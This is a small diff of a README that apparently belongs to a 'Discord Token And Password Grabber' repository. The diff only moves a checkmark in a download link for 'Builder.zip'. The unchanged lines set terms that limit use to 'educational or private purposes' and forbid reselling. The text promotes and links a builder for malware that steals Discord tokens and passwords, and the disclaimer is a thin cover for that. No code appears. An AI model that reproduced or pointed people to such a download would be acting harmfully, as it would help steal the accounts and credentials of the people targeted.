@@ -1,4 +1,4 @@
-## [✔Builder](https://github.com/X-Ii7x/Discord-Token-And-Password-Grabber/files/7674190/Builder.zip) 
+## [Builder✔](https://github.com/X-Ii7x/Discord-Token-And-Password-Grabber/files/7674190/Builder.zip) 
 # Terms
 - [x] You only use it for educational or private purposes.
 - [x] Reselling is forbidden.
